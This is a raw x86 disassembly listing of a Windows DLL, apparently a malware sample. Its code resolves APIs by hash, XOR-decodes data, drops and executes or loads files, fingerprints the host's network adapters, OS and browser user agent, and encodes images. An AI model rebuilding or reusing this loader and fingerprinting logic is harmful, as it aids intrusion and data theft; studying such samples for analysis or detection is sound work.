cmp [ ebp + 0x8 ] esi
je r-xdata
mov eax esi
pop esi
pop ebp
retn
cmp [ ebp + 0x8 ] 0xffffffff
je r-xdata
push esi
push 0x1
push 0xa4137e37
call sub_100027c6
add esp 0xc
test eax eax
je r-xdata
push esi
push 0x1
push 0x99885504
push eax
call sub_1000281e
add esp 0x10
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call eax
mov esi eax
neg esi
sbb esi esi
inc esi
sub_10002f64
push ebp
mov ebp esp
sub esp 0x24
push esi
xor esi esi
push esi
push 0x1
push 0xa4137e37
mov [ ebp - 0x4 ] esi
call sub_100027c6
add esp 0xc
test eax eax
je r-xdata
mov eax esi
pop esi
mov esp ebp
pop ebp
retn
push esi
push 0x1
push 0x46264019
push eax
call sub_1000281e
mov ecx eax
add esp 0x10
test ecx ecx
je r-xdata
mov esi [ ebp - 0x4 ]
push edi
xor eax eax
mov [ ebp - 0x24 ] 0x18
lea edi [ ebp - 0x20 ]
mov [ ebp - 0x8 ] esi
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov eax [ ebp + 0x8 ]
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x24 ]
push eax
push 0x43a
lea eax [ ebp - 0x4 ]
push eax
call ecx
mov esi [ ebp - 0x4 ]
xor ecx ecx
test eax eax
pop edi
cmovne esi ecx
jmp r-xdata
sub_10002fe0
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x10 ]
xor esi esi
push esi
push esi
push edi
push esi
push 0x1
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ CryptStringToBinaryA@IAT ]
cmp [ edi ] esi
je r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn
push [ edi ]
call sub_10003ba2
pop ecx
push 0x0
push 0x0
push edi
mov esi eax
push esi
push 0x1
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ CryptStringToBinaryA@IAT ]
sub_10003024
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push ebx
push esi
push eax
push 0x0
mov ebx 0x40000001
push ebx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ CryptBinaryToStringA@IAT ]
push [ ebp - 0x4 ]
call sub_10003ba2
pop ecx
mov esi eax
lea eax [ ebp - 0x4 ]
push eax
push esi
push ebx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ CryptBinaryToStringA@IAT ]
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_1000306b
push ebp
mov ebp esp
push esi
push edi
push [ ebp + 0x8 ]
call [ lstrlenA@IAT ]
xor ecx ecx
push 0x2
pop edx
lea esi [ eax + 0x1 ]
mov eax esi
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_10003ba2
pop ecx
push esi
mov edi eax
push edi
push 0xffffffff
push [ ebp + 0x8 ]
push 0x0
push 0x0
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebp
retn
push edi
call j_sub_10003b81
pop ecx
xor edi edi
sub_100030b9
push ebp
mov ebp esp
push esi
push edi
xor eax eax
push eax
push eax
push eax
push eax
push 0xffffffff
push [ ebp + 0x8 ]
push eax
push 0xfde9
call [ WideCharToMultiByte@IAT ]
mov esi eax
push esi
call sub_10003ba2
pop ecx
mov edi eax
xor eax eax
push eax
push eax
push esi
push edi
push 0xffffffff
push [ ebp + 0x8 ]
push eax
push 0xfde9
call [ WideCharToMultiByte@IAT ]
mov eax edi
pop edi
pop esi
pop ebp
retn
sub_100030fd
push ebp
mov ebp esp
sub esp 0x14
push ebx
push edi
lea eax [ ebp - 0x8 ]
xor edi edi
and [ ebp - 0x8 ] edi
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10002fe0
mov ebx eax
add esp 0xc
test ebx ebx
je r-xdata
mov eax edi
pop edi
pop ebx
mov esp ebp
pop ebp
retn
and [ ebp - 0x4 ] edi
lea eax [ ebp - 0x4 ]
push esi
push 0x4
push ebx
push eax
call sub_10003373
mov esi [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
add esi 0xfffffffc
xor eax 0xaa7d756
push esi
mov [ ebp - 0x14 ] eax
call sub_10003ba2
add esp 0x10
mov edx eax
xor ecx ecx
mov [ ebp - 0x10 ] edx
test esi esi
je r-xdata
and [ ebp - 0xc ] edi
lea eax [ ebp - 0xc ]
push 0x2
push edx
push eax
call sub_10003373
mov eax [ ebp + 0x10 ]
add esi 0xfffffffe
mov [ eax ] esi
lea eax [ esi + 0x1 ]
push eax
call sub_10003ba2
mov ecx [ ebp - 0x10 ]
mov edi eax
push esi
add ecx 0x2
push ecx
push edi
call sub_10003373
push esi
push edi
push [ ebp - 0xc ]
call sub_10003300
add esp 0x28
pop esi
test al al
jne r-xdata
mov eax ecx
and eax 0x3
mov al [ ebp + eax - 0x14 ]
xor al [ ebx + ecx + 0x4 ]
mov [ ecx + edx ] al
inc ecx
cmp ecx esi
jb r-xdata
push [ ebp - 0x10 ]
call j_sub_10003b81
push ebx
call j_sub_10003b81
pop ecx
pop ecx
push edi
call j_sub_10003b81
pop ecx
xor edi edi
sub_100031d3
push ebp
mov ebp esp
push ecx
push ebx
mov ebx [ ebp + 0xc ]
push esi
lea eax [ ebx + 0x1 ]
push eax
call sub_10003ba2
mov esi eax
xor eax eax
mov [ ebp + 0xc ] eax
pop ecx
test ebx ebx
jle r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push edi
mov edi [ ebp + 0x8 ]
sub edi esi
lea ecx [ eax + esi ]
mov [ ebp - 0x4 ] 0x11
xor edx edx
div [ ebp - 0x4 ]
mov al [ edx + r--data ]
xor al [ edi + ecx ]
mov [ ecx ] al
mov eax [ ebp + 0xc ]
inc eax
mov [ ebp + 0xc ] eax
cmp eax ebx
jl r-xdata
pop edi
sub_10003225
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
push 0xffffffff
push 0x1010101
call sub_10003a46
mov ebx [ ebp + 0xc ]
pop ecx
mov [ ebp - 0x8 ] eax
xor eax 0xaa7d756
cmp [ ebp + 0x10 ] 0x0
pop ecx
mov [ ebp - 0x4 ] eax
push ebx
je r-xdata
call sub_10003ba2
push ebx
push [ ebp + 0x8 ]
mov edi eax
mov [ ebp + 0x10 ] eax
push edi
call sub_10003373
add esp 0x10
push [ ebp + 0x8 ]
call sub_10003319
movzx eax ax
lea esi [ ebx + 0x2 ]
push esi
mov [ ebp + 0xc ] eax
call sub_10003ba2
mov edi eax
lea eax [ ebp + 0xc ]
push 0x2
push eax
push edi
mov [ ebp + 0x10 ] edi
call sub_10003373
push ebx
push [ ebp + 0x8 ]
lea ecx [ edi + 0x2 ]
push ecx
call sub_10003373
add esp 0x24
mov ebx esi
jmp r-xdata
lea esi [ ebx + 0x4 ]
push esi
call sub_10003ba2
mov edi eax
lea eax [ ebp - 0x8 ]
push 0x4
push eax
push edi
call sub_10003373
push ebx
mov ebx [ ebp + 0x10 ]
lea ecx [ edi + 0x4 ]
push ebx
push ecx
call sub_10003373
push esi
push edi
call sub_10003024
push edi
mov esi eax
call j_sub_10003b81
push ebx
call j_sub_10003b81
add esp 0x2c
mov eax esi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ecx
and eax 0x3
mov al [ ebp + eax - 0x4 ]
xor [ ecx + edi ] al
inc ecx
cmp ecx ebx
jb r-xdata
xor ecx ecx
test ebx ebx
je r-xdata
sub_10003319
push ebp
mov ebp esp
push ecx
xor edx edx
mov cx dx
mov [ ebp - 0x4 ] edx
cmp [ ebp + 0xc ] edx
jbe r-xdata
mov ax cx
mov esp ebp
pop ebp
retn
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
shr cx 0x1
mov [ ebp - 0x4 ] cx
mov eax 0x2042
xor ax cx
shr ax 0x1
movzx eax ax
mov [ ebp - 0x4 ] eax
mov cx ax
jmp r-xdata
mov al bl
xor al [ ebp - 0x4 ]
test al 0x1
je r-xdata
inc edx
cmp edx [ ebp + 0xc ]
jb r-xdata
shr bl 0x1
sub esi 0x1
jne r-xdata
mov bl [ edx + edi ]
push 0x8
pop esi
pop edi
pop esi
pop ebx
sub_10003373
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0x10 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov edx [ ebp + 0xc ]
push edi
mov edi eax
sub edi edx
mov cl [ edx ]
mov [ edi + edx ] cl
inc edx
sub esi 0x1
jne r-xdata
pop edi
sub_10003398
push ebp
mov ebp esp
mov ecx [ ebp + 0x10 ]
test ecx ecx
je r-xdata
mov eax [ ebp + 0x8 ]
pop ebp
retn
movzx eax [ ebp + 0xc ]
push esi
mov esi ecx
imul eax eax 0x1010101
push edi
mov edi [ ebp + 0x8 ]
shr ecx 0x2
[ edi ]
mov ecx esi
and ecx 0x3
[ edi ]
pop edi
pop esi
sub_100033c6
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
jmp r-xdata
mov cl [ eax ]
test cl cl
jne r-xdata
cmp cl dl
je r-xdata
cmp cl dl
je r-xdata
pop ebp
retn
inc eax
xor eax eax
sub_100033e4
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0xc ]
cmp [ ebx ] 0x0
jne r-xdata
mov al [ edx ]
push esi
push edi
test al al
je r-xdata
mov eax edx
jmp r-xdata
xor eax eax
mov edi edx
sub edi ebx
pop ebx
pop ebp
retn
cmp [ esi ] 0x0
je r-xdata
mov al [ esi ]
test al al
je r-xdata
mov eax edx
jmp r-xdata
inc edx
inc edi
mov al [ edx ]
test al al
jne r-xdata
movsx ecx [ edi + esi ]
movsx eax al
sub ecx eax
jne r-xdata
pop edi
pop esi
mov esi ebx
test al al
je r-xdata
inc esi
cmp [ edi + esi ] cl
jne r-xdata
sub_10003438
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov dx [ ebp + 0xc ]
jmp r-xdata
movzx ecx [ eax ]
test cx cx
jne r-xdata
cmp cx dx
je r-xdata
cmp [ eax ] dx
je r-xdata
pop ebp
retn
add eax 0x2
xor eax eax
sub_1000345d
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
movzx edi [ edx ]
movzx ecx [ esi ]
sub ecx edi
jne r-xdata
pop edi
pop esi
test ecx ecx
jns r-xdata
sub esi edx
xor eax eax
test ecx ecx
setg al
pop ebp
retn
or eax 0xffffffff
pop ebp
retn
add edx 0x2
movzx edi [ edx ]
movzx ecx [ esi + edx ]
sub ecx edi
je r-xdata
test di di
je r-xdata
sub_1000349b
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
xor eax eax
push ebx
mov ebx [ ebp + 0xc ]
cmp [ ebx ] ax
jne r-xdata
movzx eax [ edx ]
push esi
push edi
test ax ax
je r-xdata
mov eax edx
jmp r-xdata
xor eax eax
mov edi edx
sub edi ebx
pop ebx
pop ebp
retn
xor eax eax
movzx eax [ esi ]
test ax ax
je r-xdata
mov eax edx
jmp r-xdata
add edx 0x2
add edi 0x2
movzx eax [ edx ]
test ax ax
jne r-xdata
movzx ecx [ edi + esi ]
sub ecx eax
jne r-xdata
pop edi
pop esi
mov esi ebx
test ax ax
je r-xdata
add esi 0x2
xor eax eax
cmp [ edi + esi ] ax
jne r-xdata
jmp r-xdata
cmp [ esi ] ax
je r-xdata
sub_10003515
push esi
mov esi ecx
cmp [ esi + 0xc ] 0x0
je r-xdata
cmp [ esi + 0x8 ] 0x0
je r-xdata
push [ esi + 0xc ]
call j_sub_10003b81
pop ecx
cmp [ esi + 0x4 ] 0x0
je r-xdata
push [ esi + 0x8 ]
call j_sub_10003b81
pop ecx
pop esi
retn
push [ esi + 0x4 ]
call j_sub_10003b81
pop ecx
sub_10003547
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi ] 0x0
je r-xdata
lea eax [ esi + 0x10 ]
push eax
call [ DeleteFileW@IAT ]
push esi
call j_sub_10003b81
pop ecx
xor eax eax
pop esi
pop ebp
retn 0x4
push 0xffffffff
push [ esi ]
call [ WaitForSingleObject@IAT ]
sub_10003575
push ebp
mov ebp esp
sub esp 0x70
cmp [ ebp + 0x8 ] 0x0
push edi
mov edi ecx
je r-xdata
push 0x12
pop eax
cmp [ ebp + 0xc ] 0x0
je r-xdata
push ebx
push esi
push 0x0
call [ SetLastError@IAT ]
push 0x0
push [ edi + 0xc ]
call [ CreateDirectoryW@IAT ]
mov esi eax
call [ GetLastError@IAT ]
mov ebx eax
test esi esi
jne r-xdata
push 0x802
call sub_10003ba2
push 0x25
pop edx
push 0x73
pop ecx
mov ebx eax
mov [ ebp - 0x1c ] dx
push 0x5c
pop eax
push [ edi + 0x4 ]
mov [ ebp - 0x18 ] ax
xor eax eax
push [ edi + 0xc ]
mov [ ebp - 0x12 ] ax
lea eax [ ebp - 0x1c ]
push eax
push ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x1a ] cx
mov [ ebp - 0x16 ] dx
mov [ ebp - 0x14 ] cx
call [ wsprintfW@IAT ]
mov esi [ SetLastError@IAT ]
add esp 0x14
mov [ ebp - 0x10 ] eax
push 0x0
call esi
xor eax eax
push eax
push 0x2
push 0x2
push eax
push eax
push 0x40000000
push ebx
call [ CreateFileW@IAT ]
mov [ ebp - 0x8 ] eax
call [ GetLastError@IAT ]
cmp [ ebp - 0x8 ] 0xffffffff
mov ebx eax
je r-xdata
cmp ebx 0xb7
jne r-xdata
push [ ebp - 0x4 ]
call j_sub_10003b81
pop ecx
xor ebx ebx
push ebx
call esi
push ebx
lea eax [ ebp - 0xc ]
mov [ ebp - 0xc ] ebx
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp - 0x8 ]
call [ WriteFile@IAT ]
mov esi eax
call [ GetLastError@IAT ]
push [ ebp - 0x8 ]
mov ebx eax
call [ CloseHandle@IAT ]
test esi esi
je r-xdata
pop esi
mov eax ebx
pop ebx
jmp r-xdata
pop edi
mov esp ebp
pop ebp
retn 0x8
push 0x40
xor esi esi
lea eax [ ebp - 0x6c ]
push esi
push eax
call sub_10003398
add esp 0xc
mov [ ebp - 0x70 ] 0x44
cmp [ edi + 0x10 ] 0x0
xorps xmm0 xmm0
mov [ ebp - 0x44 ] 0x1
movups [ ebp - 0x2c ] xmm0
je r-xdata
cmp [ edi + 0x8 ] esi
je r-xdata
push esi
call [ SetLastError@IAT ]
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x70 ]
push eax
push esi
push esi
push esi
push esi
push esi
push esi
push esi
push [ ebp - 0x4 ]
call [ CreateProcessW@IAT ]
test eax eax
je r-xdata
cmp [ edi + 0x12 ] 0x0
je r-xdata
push 0x802
call sub_10003ba2
push 0xc
push r--data
mov esi eax
call sub_100031d3
push eax
mov [ ebp + 0x8 ] eax
call sub_1000306b
push [ edi + 0x8 ]
mov [ ebp + 0xc ] eax
push [ ebp - 0x4 ]
push eax
push r--data
push esi
call [ wsprintfW@IAT ]
add esp 0x24
xor ebx ebx
push ebx
call [ SetLastError@IAT ]
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x70 ]
push eax
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push esi
push ebx
call [ CreateProcessW@IAT ]
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
mov ebx eax
mov ebx esi
jmp r-xdata
cmp [ edi + 0x11 ] 0x0
je r-xdata
push esi
call [ SetLastError@IAT ]
push [ ebp - 0x4 ]
call [ LoadLibraryW@IAT ]
test eax eax
je r-xdata
push [ ebp + 0xc ]
call j_sub_10003b81
push [ ebp + 0x8 ]
call j_sub_10003b81
push esi
call j_sub_10003b81
add esp 0xc
jmp r-xdata
call [ GetLastError@IAT ]
mov ebx eax
mov esi [ ebp - 0x10 ]
add esi esi
lea eax [ esi + 0x12 ]
push eax
call sub_10003ba2
mov edi eax
lea eax [ ebp - 0x2c ]
push 0x10
push eax
push edi
call sub_10003373
push esi
push [ ebp - 0x4 ]
lea ecx [ edi + 0x10 ]
push ecx
call sub_10003373
add esp 0x1c
xor eax eax
push eax
push eax
push edi
push sub_10003547
push eax
push eax
call [ CreateThread@IAT ]
push eax
mov ebx esi
call [ FreeLibrary@IAT ]
jmp r-xdata
sub_100037e2
push ebp
mov ebp esp
sub esp 0x18
push esi
mov esi ecx
push edi
xor edi edi
cmp [ esi + 0x13 ] 0x0
jne r-xdata
push ebx
push 0x802
call sub_10003ba2
mov ebx eax
mov eax [ esi + 0xc ]
mov [ ebp - 0x18 ] ebx
pop ecx
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
push 0x25
pop eax
push 0x73
mov [ ebp - 0x10 ] ax
pop eax
push [ esi + 0x4 ]
mov [ ebp - 0xe ] ax
xor eax eax
mov [ ebp - 0xc ] ax
lea eax [ ebp - 0x10 ]
push eax
push ebx
call [ wsprintfW@IAT ]
add esp 0xc
cmp [ eax ] di
je r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
push ebx
call j_sub_10003b81
pop ecx
mov eax edi
pop ebx
push edi
call [ SetLastError@IAT ]
push edi
push esi
call [ GetFileSize@IAT ]
mov ebx eax
call [ GetLastError@IAT ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
cmp ebx 0xffffffff
je r-xdata
push 0x25
pop ecx
push 0x73
pop edx
push 0x5c
mov [ ebp - 0x14 ] cx
pop ecx
push 0x25
mov [ ebp - 0x10 ] cx
pop ecx
push [ esi + 0x4 ]
mov [ ebp - 0xe ] cx
xor ecx ecx
push eax
lea eax [ ebp - 0x14 ]
mov [ ebp - 0x12 ] dx
push eax
push ebx
mov [ ebp - 0xc ] dx
mov [ ebp - 0xa ] cx
call [ wsprintfW@IAT ]
add esp 0x10
jmp r-xdata
push esi
call [ CloseHandle@IAT ]
mov ebx [ ebp - 0x18 ]
push ebx
call sub_10003ba2
pop ecx
push edi
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] edi
call [ SetLastError@IAT ]
push edi
lea eax [ ebp - 0x8 ]
push eax
push ebx
push [ ebp - 0x4 ]
push esi
call [ ReadFile@IAT ]
mov esi eax
call [ GetLastError@IAT ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
test esi esi
je r-xdata
push edi
call [ SetLastError@IAT ]
push edi
push 0x80
push 0x3
push edi
push edi
push 0x80000000
push ebx
call [ CreateFileW@IAT ]
mov esi eax
mov [ ebp - 0xc ] esi
call [ GetLastError@IAT ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
cmp esi 0xffffffff
je r-xdata
push [ ebp - 0x4 ]
call j_sub_10003b81
mov esi [ ebp - 0xc ]
pop ecx
cmp [ ebp - 0x8 ] ebx
jne r-xdata
push ebx
push [ ebp - 0x4 ]
mov [ ecx ] edi
call sub_10003024
pop ecx
pop ecx
mov edi eax
sub_10003944
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
test eax eax
je r-xdata
pop esi
pop ebp
retn 0x4
push eax
mov [ esi ] eax
call sub_1000306b
pop ecx
mov [ esi + 0x4 ] eax
sub_1000397e
push ebp
mov ebp esp
push ecx
cmp [ ebp + 0x8 ] 0x0
mov [ ebp - 0x4 ] ecx
je r-xdata
mov esp ebp
pop ebp
retn 0x4
push ebx
push [ ebp + 0x8 ]
call sub_1000306b
mov ebx eax
pop ecx
test ebx ebx
je r-xdata
pop ebx
push esi
push 0x0
push 0x0
push ebx
call [ ExpandEnvironmentStringsW@IAT ]
xor ecx ecx
mov esi eax
push 0x2
pop edx
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_10003ba2
pop ecx
mov ecx [ ebp - 0x4 ]
push esi
push eax
push ebx
mov [ ecx + 0xc ] eax
call [ ExpandEnvironmentStringsW@IAT ]
push ebx
call j_sub_10003b81
pop ecx
pop esi
sub_100039fb
push esi
push 0x3e
mov esi ecx
call sub_10003ba2
pop ecx
mov [ esi ] eax
mov dl 0x30
lea eax [ edx - 0x30 ]
movsx ecx al
mov eax [ esi ]
mov [ ecx + eax ] dl
inc dl
cmp dl 0x3a
jl r-xdata
mov dl 0x41
lea eax [ edx - 0x37 ]
movsx ecx al
mov eax [ esi ]
mov [ ecx + eax ] dl
inc dl
cmp dl 0x5b
jl r-xdata
mov dl 0x61
lea eax [ edx - 0x3d ]
movsx ecx al
mov eax [ esi ]
mov [ ecx + eax ] dl
inc dl
cmp dl 0x7b
jl r-xdata
pop esi
retn
sub_10003a60
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
push [ ebp + 0xc ]
mov [ ebp - 0x4 ] ecx
push 0x1
call sub_10003a46
mov esi [ ebp + 0x8 ]
mov edi eax
lea edx [ esi + 0x1 ]
imul edx edi
inc edx
push edx
call sub_10003ba2
and [ ebp + 0xc ] 0x0
add esp 0xc
mov ebx eax
test edi edi
je r-xdata
pop edi
pop esi
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x8
push esi
push 0x1
call sub_10003a46
pop ecx
pop ecx
mov ecx [ ebp - 0x4 ]
push eax
call sub_10003ad9
mov ecx [ ebp + 0xc ]
mov esi eax
push esi
add ecx ebx
push r--data
push ecx
call [ wsprintfA@IAT ]
add [ ebp + 0xc ] eax
push esi
call j_sub_10003b81
mov esi [ ebp + 0x8 ]
add esp 0x10
sub edi 0x1
jne r-xdata
sub_10003ad9
push ebp
mov ebp esp
push ecx
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
mov [ ebp - 0x4 ] ecx
lea eax [ ebx + 0x1 ]
push eax
call sub_10003ba2
xor esi esi
mov edi eax
pop ecx
test ebx ebx
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
push 0x3d
push 0x0
call sub_10003a46
pop ecx
pop ecx
mov ecx [ ebp - 0x4 ]
mov ecx [ ecx ]
mov al [ eax + ecx ]
mov [ esi + edi ] al
inc esi
cmp esi ebx
jb r-xdata
sub_10003b1e
push ebp
mov ebp esp
sub esp 0x10
push ebx
mov ebx [ Sleep@IAT ]
push esi
push edi
push 0x0
call ebx
lea eax [ ebp - 0x8 ]
push eax
call [ QueryPerformanceCounter@IAT ]
push 0x0
call ebx
lea eax [ ebp - 0x10 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov edi [ ebp - 0x8 ]
mov esi [ ebp - 0x10 ]
xor edi [ ebp - 0x4 ]
xor esi [ ebp - 0xc ]
push 0x0
call ebx
call [ GetTickCount@IAT ]
xor eax esi
xor eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_10003b81
push ebp
mov ebp esp
call [ GetProcessHeap@IAT ]
test eax eax
je r-xdata
pop ebp
retn
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push [ ebp + 0x8 ]
push 0x0
push eax
call [ HeapFree@IAT ]
sub_10003bb0
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push esi
push eax
push [ ebp + 0xc ]
mov esi ecx
push [ ebp + 0x8 ]
mov [ esi ] r--data
call GdipCreateBitmapFromHBITMAP
mov [ esi + 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0x8
sub_10003be2
push ebp
mov ebp esp
push esi
mov esi ecx
push [ esi + 0x4 ]
mov [ esi ] r--data
call GdipDisposeImage
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
test [ ebp + 0x8 ] 0x4
jne r-xdata
push 0x10
push esi
call sub_10002422
pop ecx
pop ecx
push esi
call GdipFree
jmp r-xdata
sub_10003c1b
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push esi
mov esi ecx
push eax
push [ esi + 0x4 ]
call GdipCloneImage
test eax eax
je r-xdata
push 0x10
call GdipAlloc
test eax eax
je r-xdata
mov [ esi + 0x8 ] eax
xor eax eax
mov edx [ esi + 0x8 ]
mov ecx [ ebp - 0x4 ]
mov [ eax ] r--data
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] edx
jmp r-xdata
pop esi
mov esp ebp
pop ebp
retn
sub_10003c5f
push ebp
mov ebp esp
push 0x10
call GdipAlloc
test eax eax
je r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0xc ]
mov ecx eax
push [ ebp + 0x8 ]
call sub_10003bb0
pop ebp
retn
sub_10003c80
push ebp
mov ebp esp
sub esp 0x10
push ebx
lea eax [ ebp - 0x8 ]
xor ebx ebx
push eax
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] ebx
push eax
mov [ ebp - 0x8 ] ebx
call GdipGetImageEncodersSize
mov eax [ ebp - 0x8 ]
test eax eax
jne r-xdata
push edi
xor ecx ecx
push 0x4c
pop edx
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_10003ba2
mov edi eax
mov [ ebp - 0x10 ] edi
pop ecx
test edi edi
jne r-xdata
xor al al
jmp r-xdata
push esi
push edi
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
call GdipGetImageEncoders
mov esi ebx
cmp [ ebp - 0x4 ] ebx
jbe r-xdata
xor al al
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push edi
call j_sub_10003b81
pop ecx
mov al bl
pop esi
lea eax [ edi + 0x30 ]
mov [ ebp - 0xc ] eax
pop edi
imul esi esi 0x4c
mov bl 0x1
add esi edi
mov edi [ ebp + 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
inc esi
add eax 0x4c
mov [ ebp - 0xc ] eax
cmp esi [ ebp - 0x4 ]
jb r-xdata
push [ ebp + 0x8 ]
push [ eax ]
call sub_1000345d
pop ecx
pop ecx
test eax eax
je r-xdata
jmp r-xdata
sub_10003d26
push ebp
mov ebp esp
sub esp 0x11c
push esi
xor esi esi
mov [ ebp - 0x11c ] 0x11c
push 0x100
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x118 ] esi
push esi
push eax
mov [ ebp - 0x114 ] esi
mov [ ebp - 0x110 ] esi
mov [ ebp - 0x10c ] esi
call sub_10003398
add esp 0xc
mov [ ebp - 0x4 ] esi
xor eax eax
mov [ ebp - 0x8 ] eax
push 0x3
push 0x20
push 0x3
push 0x1
push 0x3
push 0x2
push esi
push esi
mov esi [ VerSetConditionMask@IAT ]
call esi
push edx
push eax
call esi
push edx
push eax
call esi
movzx ecx [ ebp + 0x8 ]
push edx
mov [ ebp - 0x118 ] ecx
movzx ecx [ ebp + 0xc ]
push eax
mov [ ebp - 0x114 ] ecx
lea eax [ ebp - 0x11c ]
mov cx [ ebp + 0x10 ]
push 0x23
push eax
mov [ ebp - 0x8 ] cx
call [ VerifyVersionInfoW@IAT ]
neg eax
pop esi
sbb eax eax
neg eax
mov esp ebp
pop ebp
retn
sub_10003dc7
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push eax
call [ GetCurrentProcess@IAT ]
push eax
call [ IsWow64Process@IAT ]
cmp [ ebp - 0x4 ] 0x0
mov al 0x20
push 0x40
movzx eax al
pop ecx
cmovne eax ecx
mov esp ebp
pop ebp
retn
sub_10003df3
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push esi
push eax
push r--data
push 0x0
call ObtainUserAgentString
push [ ebp - 0x4 ]
call sub_10003ba2
pop ecx
mov esi eax
lea eax [ ebp - 0x4 ]
push eax
push esi
push 0x0
call ObtainUserAgentString
mov eax esi
pop esi
mov esp ebp
pop ebp
retn
sub_10003e2a
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
xor edi edi
lea eax [ ebp - 0x4 ]
push eax
push edi
push edi
push edi
push edi
mov [ ebp - 0x4 ] edi
call GetAdaptersAddresses
mov eax [ ebp - 0x4 ]
xor ecx ecx
mov edx 0x178
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_10003ba2
pop ecx
mov esi eax
lea eax [ ebp - 0x4 ]
push eax
push esi
push edi
push edi
push edi
mov [ ebp - 0xc ] esi
call GetAdaptersAddresses
push r--data
mov [ ebp - 0x8 ] edi
call [ lstrlenW@IAT ]
mov [ ebp - 0x10 ] eax
mov ebx esi
test esi esi
je r-xdata
mov eax [ ebp - 0x8 ]
xor ecx ecx
push 0x2
add eax 0x2
pop edx
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_10003ba2
cmp [ ebp - 0xc ] 0x0
mov ebx eax
pop ecx
je r-xdata
push [ ebx + 0x28 ]
call [ lstrlenW@IAT ]
push [ ebx + 0x24 ]
mov esi eax
call [ lstrlenW@IAT ]
imul ecx [ ebx + 0x34 ] 0x3
add eax esi
mov esi [ ebp - 0x10 ]
inc edi
mov ebx [ ebx + 0x8 ]
lea ecx [ ecx + esi * 2 ]
add ecx eax
add edi ecx
test ebx ebx
jne r-xdata
push ebx
call sub_100030b9
push ebx
mov esi eax
call j_sub_10003b81
push [ ebp - 0xc ]
call j_sub_10003b81
add esp 0xc
mov eax esi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
movzx eax [ esi + 0x2c ]
push eax
push [ esi + 0x24 ]
